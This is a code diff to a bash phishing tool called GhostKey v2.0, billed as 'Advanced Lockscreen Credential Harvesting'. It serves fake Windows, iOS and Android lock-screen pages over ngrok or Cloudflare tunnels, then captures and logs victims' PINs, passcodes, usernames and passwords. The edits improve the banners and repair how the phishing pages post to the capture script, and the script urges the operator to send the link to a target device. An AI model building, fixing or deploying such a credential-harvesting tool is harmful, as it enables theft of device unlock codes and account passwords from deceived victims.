@@ -43,20 +43,20 @@ printf "${PURPLE}"
 echo ""
 echo "    ╔═══════════════════════════════════════════════════════════╗"
 echo "    ║                                                           ║"
-echo "    ║              🔑  G H O S T K E Y  v2.0  🔑               ║"
+echo "    ║              🔒  G H O S T K E Y  v2.0  🔒               ║"
 echo "    ║                                                           ║"
 echo "    ║          Advanced Lockscreen Credential Harvesting        ║"
 echo "    ║                                                           ║"
 echo "    ╚═══════════════════════════════════════════════════════════╝"
 printf "${CYAN}"
 echo ""
-print_centered "════════════════════════════════════════════════════"
+print_centered "══════════════════════════════════════════════════"
 printf "${WHITE}"
 print_centered "Developed by: Manjunath Yalam"
 printf "${GRAY}"
 print_centered "Enhanced Edition - 2024"
 printf "${CYAN}"
-print_centered "════════════════════════════════════════════════════"
+print_centered "══════════════════════════════════════════════════"
 echo ""
 printf "${YELLOW}"
 print_centered "⚠️  EDUCATIONAL & AUTHORIZED TESTING ONLY  ⚠️"
@@ -109,16 +109,16 @@ cat ip.txt >> ghostkey.logs.txt
 checkfound() {
 printf "\n"
 printf "${PURPLE}╔═══════════════════════════════════════════════════════════╗${NC}\n"
-printf "${PURPLE}║${NC}  ${CYAN}👻 GhostKey is listening for targets...${NC}                ${PURPLE}║${NC}\n"
+printf "${PURPLE}║${NC}  ${CYAN}💻 GhostKey is listening for targets...${NC}                ${PURPLE}║${NC}\n"
 printf "${PURPLE}║${NC}  ${GRAY}Press Ctrl+C to stop and exit${NC}                         ${PURPLE}║${NC}\n"
-printf "${PURPLE}╚═══════════════════════════════════════════════════════════╝${NC}\n"
+printf "${PURPLE}╚═══════════════════════════════════════════════════════════${NC}\n"
 printf "\n"
 
 while [ true ]; do
 if [[ -e "ip.txt" ]]; then
 printf "\n${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}\n"
 printf "${GREEN}║${NC}  ${YELLOW}🎯 TARGET CONNECTED!${NC}                                    ${GREEN}║${NC}\n"
-printf "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}\n"
+printf "${GREEN}╚═══════════════════════════════════════════════════════════${NC}\n"
 catch_ip
 rm -rf ip.txt
 fi
@@ -128,7 +128,7 @@ sleep 0.5
 if [[ -e "pin.txt" ]]; then
 printf "\n${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}\n"
 printf "${GREEN}║${NC}  ${YELLOW}📱 ANDROID PIN CAPTURED!${NC}                              ${GREEN}║${NC}\n"
-printf "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}\n"
+printf "${GREEN}╚═══════════════════════════════════════════════════════════${NC}\n"
 pin=$(tail -n1 pin.txt)
 printf "${GREEN}[${WHITE}✓${GREEN}] ${CYAN}PIN Code:${NC} ${WHITE}%s${NC}\n" $pin
 printf "${GREEN}[${WHITE}✓${GREEN}] ${CYAN}Saved to:${NC} ${WHITE}ghostkey.android.txt${NC}\n"
@@ -139,22 +139,21 @@ fi
 if [[ -e "passwords.txt" ]]; then
 printf "\n${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}\n"
 printf "${GREEN}║${NC}  ${YELLOW}💻 WINDOWS CREDENTIALS CAPTURED!${NC}                     ${GREEN}║${NC}\n"
-printf "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}\n"
-username=$(tail -n1 usernames.txt)
+printf "${GREEN}╚═══════════════════════════════════════════════════════════${NC}\n"
+username=$(tail -n1 usernames.txt 2>/dev/null || echo "Unknown")
 password=$(tail -n1 passwords.txt)
 printf "${GREEN}[${WHITE}✓${GREEN}] ${CYAN}Username:${NC} ${WHITE}%s${NC}\n" $username
 printf "${GREEN}[${WHITE}✓${GREEN}] ${CYAN}Password:${NC} ${WHITE}%s${NC}\n" $password
 printf "${GREEN}[${WHITE}✓${GREEN}] ${CYAN}Saved to:${NC} ${WHITE}ghostkey.windows.txt${NC}\n"
-cat usernames.txt >> ghostkey.windows.txt
+echo "Username: $username" >> ghostkey.windows.txt
 cat passwords.txt >> ghostkey.windows.txt
-rm -rf usernames.txt
-rm -rf passwords.txt
+rm -rf usernames.txt passwords.txt
 fi
 
 if [[ -e "passcode.txt" ]]; then
 printf "\n${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}\n"
 printf "${GREEN}║${NC}  ${YELLOW}🍎 iOS PASSCODE CAPTURED!${NC}                            ${GREEN}║${NC}\n"
-printf "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}\n"
+printf "${GREEN}╚═══════════════════════════════════════════════════════════${NC}\n"
 passcode=$(tail -n1 passcode.txt)
 printf "${GREEN}[${WHITE}✓${GREEN}] ${CYAN}Passcode:${NC} ${WHITE}%s${NC}\n" $passcode
 printf "${GREEN}[${WHITE}✓${GREEN}] ${CYAN}Saved to:${NC} ${WHITE}ghostkey.ios.txt${NC}\n"
@@ -181,17 +180,20 @@ fi
 if [[ -z "$link" ]]; then
 printf "\n${RED}╔═══════════════════════════════════════════════════════════╗${NC}\n"
 printf "${RED}║  ❌ NGROK TUNNEL FAILED                                   ║${NC}\n"
-printf "${RED}╚═══════════════════════════════════════════════════════════╝${NC}\n\n"
+printf "${RED}╚═══════════════════════════════════════════════════════════${NC}\n\n"
 return 1
 fi
 
 payload_name="index"
 printf "${CYAN}[${WHITE}⚙${CYAN}] ${YELLOW}Building payload pages...${NC}\n"
 
+# Fix: Create cat.php with correct redirect
 sed 's+forwarding_url+'$url'+g' post.php > cat.php
-sed 's+forwarding_link+'$link'+g' win.html | sed 's+forwarding_url+'$url'+g' > win2.html
-sed 's+forwarding_link+'$link'+g' phone.html | sed 's+forwarding_url+'$url'+g' > iphone2.html
-sed 's+forwarding_link+'$link'+g' droid.html | sed 's+forwarding_url+'$url'+g' > droid2.html
+
+# Fix: Update HTML files to use cat.php directly (not forwarding_link/cat.php)
+sed "s+forwarding_link/cat.php+cat.php+g" win.html | sed 's+forwarding_url+'$url'+g' > win2.html
+sed "s+forwarding_link/cat.php+cat.php+g" phone.html | sed 's+forwarding_url+'$url'+g' > iphone2.html
+sed "s+forwarding_link/cat.php+cat.php+g" droid.html | sed 's+forwarding_url+'$url'+g' > droid2.html
 
 IFS=$'\n'
 data_base64=$(base64 -w 0 win2.html 2>/dev/null || base64 win2.html)
@@ -208,7 +210,7 @@ printf "${PURPLE}║                                                            
 printf "${PURPLE}║${NC}  ${GREEN}✓${NC} ${CYAN}Target Redirect URL:${NC}                                             ${PURPLE}║${NC}\n"
 printf "${PURPLE}║${NC}    ${GRAY}%s${NC}%-$((71-${#url}))s${PURPLE}║${NC}\n" "$url" ""
 printf "${PURPLE}║                                                                         ║${NC}\n"
-printf "${PURPLE}╚═════════════════════════════════════════════════════════════════════════╝${NC}\n"
+printf "${PURPLE}╚═════════════════════════════════════════════════════════════════════════${NC}\n"
 printf "\n"
 printf "${CYAN}💡 Tip:${NC} ${GRAY}Send this link to your target device${NC}\n"
 printf "${CYAN}📊 Logs:${NC} ${GRAY}All captures will be saved to ghostkey.*.txt files${NC}\n\n"
@@ -222,17 +224,20 @@ link=$(cat cloudflared.txt 2>/dev/null | grep -o 'https://[^ ]*trycloudflare.com
 if [[ -z "$link" ]]; then
 printf "\n${RED}╔═══════════════════════════════════════════════════════════╗${NC}\n"
 printf "${RED}║  ❌ CLOUDFLARE TUNNEL FAILED                              ║${NC}\n"
-printf "${RED}╚═══════════════════════════════════════════════════════════╝${NC}\n\n"
+printf "${RED}╚═══════════════════════════════════════════════════════════${NC}\n\n"
 return 1
 fi
 
 payload_name="index"
 printf "${CYAN}[${WHITE}⚙${CYAN}] ${YELLOW}Building payload pages...${NC}\n"
 
+# Fix: Create cat.php with correct redirect
 sed 's+forwarding_url+'$url'+g' post.php > cat.php
-sed 's+forwarding_link+'$link'+g' win.html | sed 's+forwarding_url+'$url'+g' > win2.html
-sed 's+forwarding_link+'$link'+g' phone.html | sed 's+forwarding_url+'$url'+g' > iphone2.html
-sed 's+forwarding_link+'$link'+g' droid.html | sed 's+forwarding_url+'$url'+g' > droid2.html
+
+# Fix: Update HTML files to use cat.php directly
+sed "s+forwarding_link/cat.php+cat.php+g" win.html | sed 's+forwarding_url+'$url'+g' > win2.html
+sed "s+forwarding_link/cat.php+cat.php+g" phone.html | sed 's+forwarding_url+'$url'+g' > iphone2.html
+sed "s+forwarding_link/cat.php+cat.php+g" droid.html | sed 's+forwarding_url+'$url'+g' > droid2.html
 
 IFS=$'\n'
 data_base64=$(base64 -w 0 win2.html 2>/dev/null || base64 win2.html)
@@ -249,7 +254,7 @@ printf "${PURPLE}║                                                            
 printf "${PURPLE}║${NC}  ${GREEN}✓${NC} ${CYAN}Target Redirect URL:${NC}                                             ${PURPLE}║${NC}\n"
 printf "${PURPLE}║${NC}    ${GRAY}%s${NC}%-$((71-${#url}))s${PURPLE}║${NC}\n" "$url" ""
 printf "${PURPLE}║                                                                         ║${NC}\n"
-printf "${PURPLE}╚═════════════════════════════════════════════════════════════════════════╝${NC}\n"
+printf "${PURPLE}╚═════════════════════════════════════════════════════════════════════════${NC}\n"
 printf "\n"
 printf "${CYAN}💡 Tip:${NC} ${GRAY}Send this link to your target device${NC}\n"
 printf "${CYAN}📊 Logs:${NC} ${GRAY}All captures will be saved to ghostkey.*.txt files${NC}\n\n"
@@ -396,7 +401,7 @@ redirect
 
 printf "\n${PURPLE}╔═══════════════════════════════════════════════════════════╗${NC}\n"
 printf "${PURPLE}║${NC}  ${CYAN}Select Tunneling Method:${NC}                               ${PURPLE}║${NC}\n"
-printf "${PURPLE}╚═══════════════════════════════════════════════════════════╝${NC}\n"
+printf "${PURPLE}╚═══════════════════════════════════════════════════════════${NC}\n"
 printf "${WHITE}[${CYAN}1${WHITE}]${NC} Ngrok ${GRAY}(requires authentication)${NC}\n"
 printf "${WHITE}[${CYAN}2${WHITE}]${NC} Cloudflare ${GRAY}(NO authentication needed - RECOMMENDED)${NC}\n"
 printf "${WHITE}[${CYAN}3${WHITE}]${NC} Try Both ${GRAY}(Ngrok first, then Cloudflare)${NC}\n"
